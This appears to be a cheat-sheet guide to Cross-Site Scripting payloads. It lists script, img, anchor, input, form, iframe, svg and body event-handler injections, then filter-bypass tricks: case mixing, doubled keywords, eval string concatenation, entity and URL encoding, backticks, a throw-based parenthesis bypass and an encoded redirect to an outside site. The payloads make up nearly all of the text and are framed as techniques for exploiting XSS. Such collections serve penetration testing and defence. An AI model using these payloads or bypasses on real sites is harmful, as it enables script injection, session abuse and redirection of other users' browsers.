### **Comprehensive Guide to XSS Payloads and Techniques**

Cross-Site Scripting (XSS) is a prevalent web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This guide explores various payloads and techniques for exploiting XSS, both in scenarios with no filtering and in cases where filtering mechanisms are in place.

---

### **No Filtering Scenarios**

#### **1. `<script>` Tag**
- **Basic Payload**:
  ```html
  <script>alert("xss");</script>
  ```

#### **2. `<img>` Tag**
- **Image Load Error**:
  ```html
  <img src="x" onerror=alert(1)>
  ```
- **Mouse Events**:
  - Mouse Over:
    ```html
    <img src=1 onmouseover="alert(1)">
    ```
  - Mouse Out:
    ```html
    <img src=1 onmouseout="alert(1)">
    ```

#### **3. `<a>` Tag**
- **JavaScript Links**:
  ```html
  <a href=javascript:alert('xss')>test</a>
  ```
- **Mouse Events**:
  ```html
  <a href="" onclick=alert('xss')>a</a>
  ```

#### **4. `<input>` Tag**
- **Focus/Blur Events**:
  ```html
  <input onfocus="alert('xss');">
  <input onblur=alert("xss") autofocus><input autofocus>
  ```
- **Keyboard Events**:
  ```html
  <input type="text" onkeydown="alert(1)">
  ```

#### **5. `<form>` Tag**
- **Form Actions**:
  ```html
  <form action=javascript:alert('xss') method="get">
  ```

#### **6. `<iframe>` Tag**
- **Onload Event**:
  ```html
  <iframe onload=alert("xss");></iframe>
  ```

#### **7. `<svg>` Tag**
- **Onload Event**:
  ```html
  <svg onload=alert(1)>
  ```

#### **8. `<body>` Tag**
- **Autofocus Trigger**:
  ```html
  <body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
  ```

---

### **Filtered Scenarios**

#### **1. Filtering Spaces**
- **Slash Substitution**:
  ```html
  <img/src="x"/onerror=alert("xss");>
  ```

#### **2. Filtering Keywords**
- **Case Sensitivity**:
  ```html
  <ImG sRc=x onerRor=alert("xss");>
  ```
- **Double Writing Keywords**:
  ```html
  <imimgg srsrcc=x onerror=alert("xss");>
  ```

#### **3. Character Concatenation**
- **Eval Function**:
  ```html
  <img src="x" onerror="a=aler;b=t;c='(xss);';eval(a+b+c)">
  ```

#### **4. Other Character Confusion**
- **Comments and Priority**:
  ```html
  <<script>alert("xss");//<</script>
  ```

#### **5. Encoding Bypass**
- **Unicode Encoding**:
  ```html
  <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
  ```
- **URL Encoding**:
  ```html
  <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
  ```

#### **6. Filtering Quotes**
- **Backticks**:
  ```html
  <img src="x" onerror=alert(``xss``);>
  ```

#### **7. Filtering Parentheses**
- **Throw Statement**:
  ```html
  <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
  ```

#### **8. Filtering URLs**
- **Encoded URLs**:
  ```html
  <img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>
  ```

---

### **Conclusion**



This comprehensive guide covers a wide range of XSS payloads and techniques, from basic injections to advanced encoding and filtering bypasses. Understanding these methods is crucial for both exploiting vulnerabilities during penetration testing and defending against such attacks in real-world applications. Always remember to use this knowledge ethically and responsibly.
